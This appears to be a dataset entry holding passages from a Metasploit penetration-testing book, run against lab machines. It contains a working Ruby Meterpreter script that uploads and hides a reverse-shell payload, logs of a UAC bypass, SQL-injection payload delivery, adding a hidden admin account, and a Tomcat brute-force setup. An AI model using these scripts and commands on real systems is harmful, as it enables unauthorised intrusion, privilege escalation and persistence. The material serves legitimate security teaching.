local file.\nfile_local_digestsha2(file2sha2) Returns a string with the SHA256\nchecksum of a given local file.\n242 Chapter 16\nfile_local_write(file2wrt, data2wrt) Writes a given string to a specified file.\nis_admin?() Identifies whether or not the user is an admin. Returns true\nif the user is an admin and false if not.\nis_uac_enabled?() Determines whether User Account Control (UAC) is\nenabled on the system.\nregistry_createkey(key) Creates a given registry key and returns true if\nsuccessful.\nregistry_deleteval(key,valname) Deletes a registry value given the key\nand value name. Returns true if successful.\nregistry_delkey(key) Deletes a given registry key and returns true if\nsuccessful.\nregistry_enumkeys(key) Enumerates the subkeys of a given registry key\nand returns an array of subkeys.\nregistry_enumvals(key) Enumerates the values of a given registry key and\nreturns an array of value names.\nregistry_getvaldata(key,valname) Returns the data of a given registry key\nand its value.\nregistry_getvalinfo(key,valname) Returns the data and type of a given\nregistry key and its value.\nregistry_setvaldata(key,valname,data,type) Sets the data for a given\nvalue and type of data on the target registry. Returns true if successful.\nservice_change_startup(name,mode) Changes a given service startup mode.\nThe name and the mode must be provided. The mode is a string set with\neither a corresponding auto, manual, or disable setting. The service name\nis case sensitive.\nservice_create(name, display_name, executable_on_host,startup=2) Function\nfor the creation of a service that runs its own process. Its parameters are\nthe service name as a string, the display name as a string, the path of the\nexecutable on the host that will execute at startup as a string, and the\nstartup type as an integer: 2 for Auto, 3 for Manual, or 4 for Disable\n(default is Auto).\nservice_delete(name) Function for deleting a service by deleting the key\nin the registry.\nservice_info(name) Gets Windows service information. The information\nis returned in a hash with display name, startup mode, and command\nexecuted by the service. The service name is case sensitive. Hash keys are\nName, Start, Command, and Credentials.\nservice_list() Lists all Windows services present. Returns an array con-\ntaining the services’ names.\nservice_start(name) Function for service startup. Returns 0 if the service\nis started, 1 if the service is already started, and 2 if service is disabled.\nMeterpreter Scripting 243\nservice_stop(name) Function for stopping a service. Returns 0 if the\nservice is stopped successfully, 1 if the service is already stopped or\ndisabled, and 2 if the service cannot be stopped.\nYou should understand the basics regarding the Meterpreter mixin calls\nthat you can use to add functionality to your custom script.\nRules for Writing Meterpreter Scripts\nWhen creating Meterpreter scripts, you need to understand the following\nrules before you begin your first script and if you want them to be committed\nto the Framework:\n(cid:122) Use only instance, local, and constant variables; never use global or class\nvariables because they might interfere with the Framework variables.\n(cid:122) Use hard tabs for indenting; do not use spaces.\n(cid:122) For code blocks, do not use {}. Instead, use do and end.\n(cid:122) When declaring functions, always write a comment before the declara-\ntion and provide a brief description of its purpose.\n(cid:122) Do not use sleep; use \"select(nil, nil, nil, <time>)\".\n(cid:122) Do not use puts or any other standard output calls; instead use print,\nprint_line, print_status, print_error, and print_good.\n(cid:122) Always include an -h option that will print a description and the purpose\nof the script and show the available options.\n(cid:122) If your script is meant for a specific operating system or Meterpreter plat-\nform, make sure it runs only on those platforms and prints out an error\nmessage for an unsupported OS or platform.\nCreating Your Own Meterpreter Script\nOpen up your favorite editor and create a new file called execute_upload.rb,\nlocated in scripts/meterpreter/. We’ll start by adding comments to the top of the\nfile to let everyone know the purpose of this script and to define our options\nfor the script:\n# Meterpreter script for uploading and executing another meterpreter exe\ninfo = \"Simple script for uploading and executing an additional meterpreter payload\"\n# Options\nopts = Rex::Parser::Arguments.new(\n(cid:88)\"-h\" => [ false, \"This help menu. Spawn a meterpreter shell by uploading and\nexecuting.\"],\n(cid:89)\"-r\" => [ true, \"The IP of a remote Metasploit listening for the connect back\"],\n(cid:90)\"-p\" => [ true, \"The port on the remote host where Metasploit is listening\n(default: 4444)\"]\n)\n244 Chapter 16\nThis should look somewhat familiar, because it’s almost exactly the same\nas the example from Carlos Perez that appeared earlier in the chapter. The\nhelp message is defined with -h at (cid:88), and -r and -p are specified for the\nremote IP address (cid:89) and port number (cid:90) we’ll need for our new Meterpreter\nexecutable. Note that a true statement is included; this indicates that these\nfields are required.\nNext, we define the variables we want to use throughout the script. We’ll\ncall the Rex::Text.rand_text_alpha function to create a unique executable\nname every time it’s called. This is efficient, because we don’t want to assign\nan executable name statically, which would “antivirus fingerprint” the attack.\nWe’ll also configure each argument so that it either assigns a value or prints\ninformation with, for example, the -h.\nfilename= Rex::Text.rand_text_alpha((rand(8)+6)) + \".exe\"\nrhost = Rex::Socket.source_address(\"1.2.3.4\")\nrport = 4444\nlhost = \"127.0.0.1\"\npay = nil\n#\n# Option parsing\n#\nopts.parse(args) do |opt, idx, val|\ncase opt\nwhen \"-h\"\nprint_line(info)\nprint_line(opts.usage)\nraise Rex::Script::Completed\nwhen \"-r\"\nrhost = val(cid:88)\nwhen \"-p\"\nrport = val.to_i(cid:89)\nend\nend\nNotice that we broke out each argument and assigned values or print infor-\nmation back to the user. The rhost = val (cid:88) means “take the value presented\nfrom the user when -r was input.” The rport = val.to_i (cid:89) simply assigns the\nvalue as an integer (it will always need to be an integer for a port number).\nIn the next series, we define everything we need to create our payload:\n(cid:88) payload = \"windows/meterpreter/reverse_tcp\"\n(cid:89) pay = client.framework.payloads.create(payload)\npay.datastore['LHOST'] = rhost\npay.datastore['LPORT'] = rport\nmul = client.framework.exploits.create(\"multi/handler\")\nmul.share_datastore(pay.datastore)\nmul.datastore['WORKSPACE'] = client.workspace\nMeterpreter Scripting 245\nmul.datastore['PAYLOAD'] = payload\nmul.datastore['EXITFUNC'] = 'process'\nmul.datastore['ExitOnSession'] = true\nmul.exploit_simple(\n'Payload' => mul.datastore['PAYLOAD'],\n'RunAsJob' => true\n)\nWe define our payload as a windows/meterpreter/reverse_tcp at (cid:88), generate\nthe payload calling the client.framework.payloads.create(payload) at (cid:89), and\nspecify the necessary parameters to create the multi-handler. These are all\nthe required fields we need to set our payload using the LHOST and LPORT options\nand create a listener.\nNext we create our executable (win32pe meterpreter), upload it to our\ntarget machine, and execute it:\n(cid:88) if client.platform =~ /win32|win64/\n(cid:89)tempdir = client.fs.file.expand_path(\"%TEMP%\")\nprint_status(\"Uploading meterpreter to temp directory...\")\nraw = pay.generate\n(cid:90)exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)\ntempexe = tempdir + \"\\\\\" + filename\ntempexe.gsub!(\"\\\\\\\\\", \"\\\\\")\nfd = client.fs.file.new(tempexe, \"wb\")\nfd.write(exe)\nfd.close\nprint_status(\"Executing the payload on the system...\")\nexecute_payload = \"#{tempdir}\\\\#{filename}\"\npid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})\nend\nThe variables called #{something} have already been defined within the\nscript and will be called later. Notice that we already defined tempdir and\nfilename. Moving into the script, we first include an if statement to detect\nwhether the platform we are targeting is a Windows-based system (cid:88); otherwise,\nthe attack won’t run. We then expand the temp directory (cid:89) on the target\nmachine; this would be the equivalent of %TEMP%. Next we create a new\nfile on the system and write out the new EXE we just generated from the\n::Msf::Util::EXE.to_win32pe (cid:90) call. Remember that we set the session.sys\n.process.execute to Hidden so that the target user won’t see anything pop\nupon his side.\nPutting this all together, our final script should look something like this:\n# Meterpreter script for uploading and executing another meterpreter exe\ninfo = \"Simple script for uploading and executing an additional meterpreter payload\"\n#\n# Options\n246 Chapter 16\n#\nopts = Rex::Parser::Arguments.new(\n\"-h\" => [ false, \"This help menu. Spawn a meterpreter shell by uploading and\nexecuting.\"],\n\"-r\" => [ true, \"The IP of a remote Metasploit listening for the connect back\"],\n\"-p\" => [ true, \"The port on the remote host where Metasploit is listening\n(default: 4444)\"]\n)\n#\n# Default parameters\n#\nfilename = Rex::Text.rand_text_alpha((rand(8)+6)) + \".exe\"\nrhost = Rex::Socket.source_address(\"1.2.3.4\")\nrport = 4444\nlhost = \"127.0.0.1\"\npay = nil\n#\n# Option parsing\n#\nopts.parse(args) do |opt, idx, val|\ncase opt\nwhen \"-h\"\nprint_line(info)\nprint_line(opts.usage)\nraise Rex::Script::Completed\nwhen \"-r\"\nrhost = val\nwhen \"-p\"\nrport = val.to_i\nend\nend\npayload = \"windows/meterpreter/reverse_tcp\"\npay = client.framework.payloads.create(payload)\npay.datastore['LHOST'] = rhost\npay.datastore['LPORT'] = rport\nmul = client.framework.exploits.create(\"multi/handler\")\nmul.share_datastore(pay.datastore)\nmul.datastore['WORKSPACE'] = client.workspace\nmul.datastore['PAYLOAD'] = payload\nmul.datastore['EXITFUNC'] = 'process'\nmul.datastore['ExitOnSession'] = true\nprint_status(\"Running payload handler\")\nmul.exploit_simple(\n'Payload' => mul.datastore['PAYLOAD'],\n'RunAsJob' => true\n)\nMeterpreter Scripting 247\nif client.platform =~ /win32|win64/\ntempdir = client.fs.file.expand_path(\"%TEMP%\")\nprint_status(\"Uploading meterpreter to temp directory\")\nraw = pay.generate\nexe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)\ntempexe = tempdir + \"\\\\\" + filename\ntempexe.gsub!(\"\\\\\\\\\", \"\\\\\")\nfd = client.fs.file.new(tempexe, \"wb\")\nfd.write(exe)\nfd.close\nprint_status(\"Executing the payload on the system\")\nexecute_payload = \"#{tempdir}\\\\#{filename}\"\npid = session.sys.process.execute(execute_payload, nil, {'Hidden' => true})\nend\nNow that we have our newly created Meterpreter script, let’s launch\nMetasploit, get into Meterpreter, and execute the script:\nmeterpreter > run execute_upload -r 172.16.32.129 -p 443\n[*] Running payload handler\n[*] Uploading meterpreter to temp directory\n[*] Executing the payload on the system\n[*] Sending stage (749056 bytes) to 172.16.32.170\n[*] Meterpreter session 2 opened (172.16.32.129:443 -> 172.16.32.170:1140) at\nTue Nov 30 23:24:19 -0500 2010\nmeterpreter >\nSuccess! We have created a Meterpreter script and successfully executed\nit to spawn a new Meterpreter shell. This is a small example of the power and\nflexibility of the Meterpreter scripting language and Ruby in general.\nOne important element to discuss briefly (as mentioned earlier) is the\nmove to convert Meterpreter scripts to a format similar to the Metasploit\nmodules. We’ll use a small demo of a module built for bypassing the Win-\ndows 7 UAC. Windows Vista and later introduced a feature similar to sudo in\nUNIX- and Linux-based systems. With this feature, a user is assigned limited\naccount permissions until administrative-level permissions are necessary.\nWhen the user needs admin rights to perform a task, a prompt appears, tell-\ning the user that admin rights are required and are being used. The ultimate\ngoal of this feature is to protect against a compromise or virus infection and\nto limit exposure only to one user account.\nIn December 2010, Dave Kennedy and Kevin Mitnick released a new\nMeterpreter module that bypassed the Windows UAC component by inject-\ning a payload into a process that had a trusted publisher certificate and was\nconsidered “UAC Safe.” When injecting into the process, a DLL can be called,\nrunning under the context of that UAC Safe process, which then executes\ncommands.\n248 Chapter 16\nIn this example, we use the post exploitation modules, which can be\nused to bypass UAC. We first start the multi/handler module with the -j flag,\nwhich allows us to accept multiple Meterpreter shells. Notice in this example\nthat when we try to run the getsystem command, it fails because it is being\nblocked by Windows UAC.\nresource (src/program_junk/meta_config)> exploit -j\n[*] Exploit running as background job.\nmsf exploit(handler) >\n[*] Started reverse handler on 0.0.0.0:443\n[*] Starting the payload handler...\n[*] Sending stage (749056 bytes) to 172.16.32.130\n[*] Meterpreter session 1 opened (172.16.32.128:443 -> 172.16.32.130:2310) at\nThu June 09 08:02:45 -0500 2011\nmsf exploit(handler) > sessions -i 1\n[*] Starting interaction with 1...\nmeterpreter > getsystem\n[-] priv_elevate_getsystem: Operation failed: Access is denied.\nmeterpreter > sysinfo\nComputer: DAVE-DEV-PC\nOS : Windows 7 (Build 7600).\nArch : x64 (Current Process is WOW64)\nLanguage: en_US\nmeterpreter >\nNotice that we can’t bridge over to a system-level account, because UAC\nis blocking us. We need to get around UAC to obtain system-level privileges\nand ultimately become an administrator so that we can further compromise\nthe machine. We press CTRL-Z to back out, keeping the session active. Then\nwe use the new format to run post modules and bypass the Windows UAC\nfunctionality.\nmsf exploit(handler) > use post/windows/escalate/bypassuac\nmsf post(bypassuac) > show options\nModule options (post/windows/escalate/bypassuac):\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST no Listener IP address for the new session\nLPORT 4444 no Listener port for the new session\nSESSION yes The session to run this module on.\nmsf post(bypassuac) > set LHOST 172.16.32.128\nLHOST => 172.16.32.128\nmsf post(bypassuac) > set SESSION 1\nSESSION => 1\nmsf post(bypassuac) > exploit\n[*] Started reverse handler on 172.16.32.128:4444\n[*] Starting the payload handler...\n[*] Uploading the bypass UAC executable to the filesystem...\nMeterpreter Scripting 249\n[*] Meterpreter stager executable 73802 bytes long being uploaded..\n[*] Uploaded the agent to the filesystem....\n[*] Post module execution completed\nmsf post(bypassuac) >\n[*] Sending stage (749056 bytes) to 172.16.32.130\n[*] Meterpreter session 2 opened (172.16.32.128:4444 -> 172.16.32.130:1106) at Thu June 09\n19:50:54 -0500 2011\n[*] Session ID 2 (172.16.32.128:4444 -> 172.16.32.130:1106) processing InitialAutoRunScript\n'migrate -f'\n[*] Current server process: tYNpQMP.exe (3716)\n[*] Spawning a notepad.exe host process...\n[*] Migrating into process ID 3812\n[*] New server process: notepad.exe (3812)\nmsf post(bypassuac) > sessions -i 2\n[*] Starting interaction with 2...\nmeterpreter > getsystem\n...got system (via technique 1).\nmeterpreter >\nWe could also have executed run instead of use within the Meterpreter\nconsole and it would have leveraged the default options and executed with-\nout having to set up the various options.\nNotice in the preceding example that we succeed in gaining system-level\nrights on a target machine with UAC enabled. This small example demonstrates\nhow the post exploitation modules will ultimately be set up and converted.\nThis script works simply by uploading a previously compiled executable to\nthe target machine and then running it. Take a look at the post exploitation\nmodule for a better idea of what’s going on behind the scenes:\nroot@bt:/opt/framework3/msf3# nano modules/post/windows/escalate/bypassuac.rb\nWrapping Up\nWe won’t cover all the details of the post exploitation module because it\nis nearly identical to the attack shown in Chapter 13. Carefully walk through\neach line, and then try to build and run your own module.\nWalk through existing Meterpreter scripts and look at the different com-\nmands, calls, and functions that can be used to create your own script. If you\ncome up with a great idea for a new script, submit it to the Metasploit devel-\nopment team—who knows; it might be a script that others can use!\n250 Chapter 16"
  },
  {
    "input": "What is the process of simulating a penetration test using Metasploit and the steps involved in identifying and exploiting vulnerabilities in a target system?",
    "summary": "This text describes a simulated penetration test using Metasploit, where the goal is to identify and exploit vulnerabilities in a virtual machine environment. It outlines the process of reconnaissance, vulnerability assessment, and exploitation, including steps like SQL injection, gaining access to a system, and compromising services like Apache Tomcat. The test also covers post-exploitation activities, such as covering tracks by modifying system logs and file timestamps, and emphasizes the importance of creativity, persistence, and adapting methods during penetration testing.",
    "output": "S I M U L A T E D P E N E T R A T I O N T E S T\nPenetration testing is the pinnacle for most of us, and\nsuccessfully bypassing an organization’s defenses dur-\ning a penetration test is one of our most rewarding\nexperiences. In this chapter, we’ll pull together what\nyou’ve learned in previous chapters as we simulate a\ncomplete penetration test. You will be re-creating steps\nthat you’ve seen in previous chapters, so most of what\nis shown here should be familiar.\nBefore you begin, download and install Metasploit’s vulnerable Linux\nvirtual machine called Metasploitable. (You can find it at http://www.thepiratebay\n.org/torrent/5573179/Metasploitable/.) Metasploitable was created to train indi-\nviduals to use Metasploit for successful exploitation. Follow the directions on\nthe site to install Metasploitable, and then power it on. We’ll be running the\nMetasploitable virtual machine alongside the Windows XP system to simulate\na small networked environment, with one virtual machine acting as an Inter-\nnet-facing system and another acting as an internal network host.\nNOTE The simulated penetration test in this chapter is a small one. You would do something\nmore in-depth if your target were a large corporation. We’ve kept this simple to make it\neasy for you to replicate.\nPre-engagement Interactions\nPlanning is the first step in pre-engagement. During a true planning phase,\nwe would identify our target(s) and our primary method of planned attack,\nwhich might include social engineering, wireless, Internet, or internal attack\nvectors. Unlike an actual penetration test, here we will not be targeting a spe-\ncific organization or a group of systems; we will perform a simulation using\nour known virtual machine.\nFor the purposes of this simulation, our target will be the protected Meta-\nsploitable virtual machine at IP address 172.16.32.162 (to configure Metasploit-\nable, use the username and password of msfadmin). The Metasploitable target\nis a machine attached to an internal network, protected by a firewall, and not\ndirectly connected to the Internet. Our Windows XP machine is behind the\nfirewall (turn on Windows Firewall) with only port 80 open at IP address\n172.16.32.131.\nIntelligence Gathering\nThe next step, intelligence gathering, is one of the most important phases\nin the process, because if you miss something here you might miss an entire\navenue of attack. Our goal at this point is to understand what we are going to\nattack and determine how we might gain access to the system.\nWe begin with a basic nmap scan (as shown next) against our Win-\ndows XP virtual machine, and we find that port 80 is open. We use nmap’s\nstealth TCP scan, which is typically effective in detecting ports without trig-\ngering defenses. Most IPSs can detect port scans, but because port scans are\nso common, they are generally considered regular noise and are ignored as\nlong as they’re not very aggressive.\nroot@bt:/# nmap -sT -P0 172.16.32.131\nStarting Nmap 5.21 ( http://nmap.org ) at 2011-05-22 23:29 EDT\nNmap scan report for 172.16.32.131\nHost is up (0.00071s latency).\n252 Chapter 17\nNot shown: 999 filtered ports\nPORT STATE SERVICE\n80/tcp open http\nNmap done: 1 IP address (1 host up) scanned in 17.46 seconds\nWe discover what appears to be a web server running on this server.\nThisis typical when attacking Internet-facing systems, most of which will limit\ntheports accessible by Internet users. In this example, we find port 80, the\nstandard HTTP port, listening. If we browse to it, we see something similar\ntoFigure 17-1.\nFigure 17-1: A web application was identified.\nThreat Modeling\nHaving identified port 80 as open, we could enumerate any available additional\nsystems, but we’re interested only in the single target. Let’s move on to threat\nmodeling and attempt to identify the best route into this system.\nThe web page we found gives us a chance to enter input in User and\nPassword fields. At this point, you, as a penetration tester, should think out-\nside the box and try to determine what the best avenue is going to be. When\nyou’re performing application security penetration tests, consider using tools\nother than Metasploit, such as the Burp Suite (http://www.portswigger.net/)\nwhen appropriate; don’t feel locked into a single tool set. In the following\nexample, we’ll attempt a manual attack by entering 'TEST (notice the leading\nSimulated Penetration Test 253\nsingle quote) into the username field and a single quote in the password\nfield. Prior to submitting the form, our username and password fields should\nlook like those in Figure 17-2.\nFigure 17-2: Attempting to leverage SQL injection\nTake a moment to consider what is occurring on the backend when the\nserver receives this input. Here we simply tried to start a new SQL statement\nand appended some bogus data to it. You probably won’t find many web\napplications in the wild that are as easy to attack as this one, but this makes\nfor a good example—and it was not too long ago that these sorts of errors\nwere in fact being discovered all the time. When we click the Submit button,\nwe get the error message shown in Figure 17-3.\nThis error message indicates that a SQL injection flaw is present based\non the SQL exception and the “Incorrect syntax near” message shows that\nthe 'TEST input caused it. With a quick Google search, we can determine\nthat the backend database is Microsoft SQL, purely based on the error mes-\nsages that were presented.\nWe won’t go into how to perform SQL injection on web applications here,\nbut you can easily manipulate the input parameters to attack a given system\nand completely compromise it. (This was covered briefly in Chapter 11.) Notice\nthat we still haven’t actually attacked a system yet; we’ve simply tried to identify a\nviable attack vector in the system. Now that we know we can potentially com-\npromise this system, it’s time to move on to the exploitation phase.\n254 Chapter 17\nFigure 17-3: Error message: SQL injection is present.\nExploitation\nWhen we looked for vulnerabilities in the web application, we found a viable\nattack vector via SQL injection. In this instance, Fast-Track is our best option\nfor compromising the MS SQL server and gaining access to our target through\nMeterpreter, because, as you’ll recall from Chapter 11, it attacks Microsoft\nSQL–based injection vulnerabilities with ease.\nAfter we have a Meterpreter console, we’ll look at how to gain access to\nthe Metasploitable system on the internal network.\nCustomizing MSFconsole\nWe’ll use SQLPwnage to deploy the Meterpreter console via SQL injection\non the target to gain administrative access to its backend database. Recall\nfrom Chapter 11 that SQLPwnage is an automated way of attacking MS SQL–\nbased injection flaws, and it uses multiple methods of attack in an attempt to\nfully compromise the SQL server via the xp_cmdshell stored procedure.\nSimulated Penetration Test 255\nBefore launching the attack, we need to set up some options through\nmsfconsole. For practice, let’s create our own Metasploit listener manually.\nFast-Track can set it up for you, but we will be adding the load auto_add_route (cid:88)\nfunction within Metasploit so that we can automatically connect to systems\non the internal network. We’ll create a listener and launch Fast-Track to attack\nthe system.\nroot@bt:/opt/framework3/msf3# msfconsole\nmsf > use multi/handler\nmsf exploit(handler) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 172.16.32.129\nLHOST => 172.16.32.129\nsmsf exploit(handler) > set LPORT 443\nLPORT => 443\n(cid:88) exploit(handler) > load auto_add_route\n[*] Successfully loaded plugin: auto_add_route\nmsf exploit(handler) > exploit -j\n[*] Exploit running as background job.\n[*] Started reverse handler on 172.16.32.129:443\n[*] Starting the payload handler...\nmsf exploit(handler) >\nWith our listener waiting for a connection from our soon-to-be compro-\nmised target, we launch Fast-Track. (When the xterm window opens, close it\nsince we already have a listener set up.)\n[+] Importing 64kb debug bypass payload into Fast-Track... [+]\n[+] Import complete, formatting the payload for delivery.. [+]\n[+] Payload Formatting prepped and ready for launch. [+]\n[+] Executing SQL commands to elevate account permissions. [+]\n[+] Initiating stored procedure: 'xp_cmdhshell' if disabled. [+]\n[+] Delivery Complete. [+]\nLaunching MSFCLI Meterpreter Handler\nCreating Metasploit Reverse Meterpreter Payload..\nCreated by msfpayload (http://www.metasploit.com).\nPayload: windows/meterpreter/reverse_tcp\nLength: 290\nOptions: LHOST=172.16.32.129,LPORT=443\nTaking raw binary and converting to hex.\nRaw binary converted to straight hex.\n[+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]\n[+] Sending chunked payload. Number 1 of 9. This may take a bit. [+]\n[+] Sending chunked payload. Number 2 of 9. This may take a bit. [+]\n. . . SNIP . . .\n[+] Conversion from hex to binary in progress. [+]\n[+] Conversion complete. Moving the binary to an executable. [+]\n[+] Splitting the hex into 100 character chunks [+]\n[+] Split complete. [+]\n256 Chapter 17\n[+] Prepping the payload for delivery. [+]\nSending chunk 1 of 8, this may take a bit...\nSending chunk 2 of 8, this may take a bit...\n. . . SNIP . . .\nUsing H2B Bypass to convert our Payload to Binary..\nRunning cleanup before launching the payload....\n[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]\nThis should look familiar. We’ve essentially attacked the web application\nthrough Fast-Track and exploited it via SQL injection attacks. We used the\nxp_cmdshell stored procedure and the binary-to-hex conversion technique to\npresent a full-fledged Meterpreter shell.\nPost Exploitation\nAt this point, we should have a Meterpreter console running in the back-\nground within msfconsole, so we can begin to scan the target’s subnet for other\nlive systems. To do this, we’ll upload nmap to the target and run it from the\nWindows machine.\nFirst, download nmap from insecure.org in an executable format and save\nit locally. We’ll be uploading this to our target. Next, we’ll connect to the\ntarget via Microsoft’s Remote Desktop Protocol (RDP), a built-in graphical\nremote administration protocol that lets you interact with the Windows\nDesktop as if you were sitting in front of the remote machine. After we’re\nconnected with our Meterpreter session, we’ll use the getgui Meterpreter script\nto tunnel RDP back out to us over port 8080 and add a new administrative\nuser to the system.\nWe enter rdesktop localhost:8080 from Back|Track’s command line, so\nwe can log into the system with the newly created user account. We then use\nMeterpreter to upload nmap to the target. Our goal is to install nmap on the\ncompromised Windows target and use the system as a staging ground for\nfurther attacks. Conversely you could use scanner/portscan/syn and scanner/\nportscan/tcp to port scan directly through Metasploit. The choice is a matter\nof personal preference and needs.\nmeterpreter > run getgui -e -f 8080\n[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator\n[*] Carlos Perez carlos_perez@darkoperator.com\n[*] Enabling Remote Desktop\n[*] RDP is already enabled\n[*] Setting Terminal Services service startup mode\n[*] Terminal Services service is already set to auto\n[*] Opening port in local firewall if necessary\n[*] Starting the port forwarding at local port 8080\n[*] Local TCP relay created: 0.0.0.0:8080 <-> 127.0.0.1:3389\nmeterpreter > shell\nSimulated Penetration Test 257\nProcess 2480 created.\nChannel 6 created.\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\nC:\\WINDOWS\\system32>net user msf metasploit /add\nnet user msf metasploit /ADD\nThe command completed successfully.\nC:\\WINDOWS\\system32>net localgroup administrators msf /add\nnet localgroup administrators msf /add\nThe command completed successfully.\nC:\\WINDOWS\\system32>\nC:\\WINDOWS\\system32>^Z\nBackground channel 6? [y/N] y\nmeterpreter > upload nmap.exe\n[*] uploading : nmap.exe -> nmap.exe\n[*] uploaded : nmap.exe -> nmap.exe\nmeterpreter >\nWe now have our launching pad for additional attacks. With nmap installed\non the target, we are essentially sitting on the internal network. We can now\nattempt to enumerate internally connected systems and further penetrate\nthe network.\nScanning the Metasploitable System\nWith our Meterpreter session granting us access to the internal network via\nthe load auto_add_route command, we can scan and exploit the inside hosts\nusing the compromised Windows XP target as the launching point. We’re\neffectively connected to the internal network, so we should be able to reach\nour Metasploitable system. Let’s begin with a basic port scan.\nnmap.exe -sT -A -P0 172.16.32.162\nPORT STATE SERVICE VERSION\n21/tcp open ftp ProFTPD 1.3.1\n|_ftp-bounce: no banner\n22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n| ssh-hostkey: 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)\n|_2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)\n23/tcp open telnet Linux telnetd\n25/tcp open smtp Postfix smtpd\n53/tcp open domain ISC BIND 9.4.2\n80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.10 with Suhosin-Patch)\n|_html-title: Site doesn't have a title (text/html).\n139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)\n3306/tcp open mysql MySQL 5.0.51a-3ubuntu5\n5432/tcp open postgresql PostgreSQL DB\n258 Chapter 17\n8009/tcp open ajp13 Apache Jserv (Protocol v1.3)\n8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1\n|_html-title: Apache Tomcat/5.5\n|_http-favicon: Apache Tomcat\nMAC Address: 00:0C:29:39:12:B2 (VMware)\nNo exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).\nNetwork Distance: 1 hop\nService Info: Host: metasploitable.localdomain; OSs: Unix, Linux\nHost script results:\n|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>\n| smb-os-discovery:\n| OS: Unix (Samba 3.0.20-Debian)\n| Name: WORKGROUP\\Unknown\n|_ System time: 2010-05-21 22:28:01 UTC-4\nOS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.19 seconds\nHere we see a series of open ports. Based on nmap’s OS detection we\nseethat the scanned system is a UNIX/Linux variant of some sort. Some of\nthese ports should jump out at you, such as FTP, Telnet, HTTP, SSH, Samba,\nMySQL, PostgreSQL, and Apache.\nIdentifying Vulnerable Services\nBecause a few ports look interesting, we’ll start banner-grabbing each one to\ntry to find a way into the system.\nmsf > use auxiliary/scanner/ftp/ftp_version\nmsf auxiliary(ftp_version) > set RHOSTS 172.16.32.162\nRHOSTS => 172.16.32.162\nmsf auxiliary(ftp_version) > run\n[*] 172.16.32.162:21 FTP Banner: '220 ProFTPD 1.3.1 Server (Debian) [::ffff:172.16.32.162]\\x0d\\x0a'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(ftp_version) >\nExiting the system, we know now that ProFTPD 1.3.1 is running on port 21.\nNext we use SSH to learn more about the target. (The addition of the -v flag\ngives us verbose output.) The next listing tells us that our target is running\nan older version of OpenSSH, specifically written for Ubuntu:\nmsf > ssh 172.16.32.162 -v\n[*] exec: ssh 172.16.32.162 –v\nOpenSSH_5.1p1 Debian-3ubuntu1, OpenSSL 0.9.8g 19 Oct 2007\nSimulated Penetration Test 259\nNow we issue the following to determine the version of Ubuntu running\non this system:\nmsf auxiliary(telnet_version) > set RHOSTS 172.16.32.162\nRHOSTS => 172.16.32.162\nmsf auxiliary(telnet_version) > run\n[*] 172.16.32.162:23 TELNET Ubuntu 8.04\\x0ametasploitable login:\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(telnet_version) >\nGreat! We know that the system is running Ubuntu 8.04 and that two\nunencrypted protocols (telnet and FTP) are in use that might come into play\nlater.\nNow let’s look at SMTP to see what version our target is running. Remem-\nber that we are trying to identify the running versions of the services operat-\ning on the various remote systems.\nmsf > use auxiliary/scanner/smtp/smtp_version\nmsf auxiliary(smtp_version) > set RHOSTS 172.16.32.162\nRHOSTS => 172.16.32.162\nmsf auxiliary(smtp_version) > run\n[*] 172.16.32.162:25 SMTP 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\\x0d\\x0a\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(smtp_version) >\nAs you can see, the Postfix mail server appears to be running on the\nMetasploitable server.\nThis process is continued through all the different ports that have been\ndiscovered as listening on our target. The various auxiliary modules are very\nuseful for this work. When you’re finished, you should have a list of the ver-\nsions of software running on the system, information that you will use when\ntargeting attacks.\nAttacking Apache Tomcat\nNow we enter the attack phase again, where we start to get our hands dirty.\nIn the course of our research, we noticed a plethora of vulnerabilities on\nthis system, including direct exploits and brute force possibilities. Now, if we\nwere performing an overt penetration test, we could run vulnerability scanners\nagainst the system to find most openings for us, but that would take all the\nfun out of it! Let’s attack Apache instead.\nWe notice that Apache Tomcat is installed on port 8180, as shown in our\nearlier port scans. After a bit of Internet research, we learn that Tomcat is\nvulnerable to a management interface brute force attack. (In most cases, we\ncan use exploit-db or Google to identify potential vulnerabilities in a given\n260 Chapter 17\nservice.) After some more research on the operating version number of\ntheApache Tomcat installation running on the target, the Tomcat manager\nseemed the best route for compromising the system. If we can get through\nTomcat’s manager function, we can use the HTTP PUT method to deploy our\npayload on the vulnerable system. We launch the attack as follows (with the\nlist of exploits and payloads snipped):\nmsf > search apache\n[*] Searching loaded modules for pattern 'apache'...\n. . . SNIP . . .\nmsf auxiliary(tomcat_mgr_login) > set RHOSTS 172.16.32.162\nRHOSTS => 172.16.32.162\nsmsf auxiliary(tomcat_mgr_login) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(tomcat_mgr_login) > set RPORT 8180\nRPORT => 8180\nmsf auxiliary(tomcat_mgr_login) > set VERBOSE false\nVERBOSE => false\nemsf auxiliary(tomcat_mgr_login) > 